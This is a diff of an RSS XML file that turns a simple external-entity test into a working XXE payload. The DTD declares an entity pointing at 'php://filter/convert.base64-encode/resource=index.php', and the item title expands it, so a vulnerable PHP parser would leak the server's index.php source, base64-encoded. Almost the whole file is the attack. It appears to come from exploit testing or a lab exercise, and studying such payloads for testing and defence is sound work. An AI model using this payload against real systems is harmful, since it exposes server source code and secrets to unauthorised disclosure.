@@ -1,27 +1,23 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-  <!ELEMENT rss (channel)>
-  <!ATTLIST rss version CDATA #REQUIRED>
-  <!ELEMENT channel (title, link, description, item+)>
-  <!ELEMENT title (#PCDATA)>
-  <!ELEMENT link (#PCDATA)>
-  <!ELEMENT description (#PCDATA)>
-  <!ELEMENT item (title, description, link, guid)>
-  <!ELEMENT guid (#PCDATA)>
-  
-  <!ENTITY example SYSTEM "./index.php">
+    <!ELEMENT rss (channel)>
+    <!ATTLIST rss version CDATA #REQUIRED>
+    <!ELEMENT channel (title, link, description, item*)>
+    <!ELEMENT title (#PCDATA)>
+    <!ELEMENT link (#PCDATA)>
+    <!ELEMENT description (#PCDATA)>
+    <!ELEMENT item (title, link, description)>
+    <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
 <rss version="2.0">
-  <channel>
-    <title>Example RSS Feed</title>
-    <link>http://example.com</link>
-    <description>This is an example RSS feed</description>
-    <item>
-      <title>&example;a</title>
-      <description>&example;</description>
-      <link>http://example.com/news1</link>
-      <guid>http://example.com</guid>
-    </item>
-  </channel>
+    <channel>
+        <title>Index PHP Content</title>
+        <link>https://www.example.com</link>
+        <description>Content of the index.php file included via external entity.</description>
+        <item>
+            <title>&file;</title>
+            <link>https://www.example.com/index.php</link>
+            <description>work</description>
+        </item>
+    </channel>
 </rss>
-
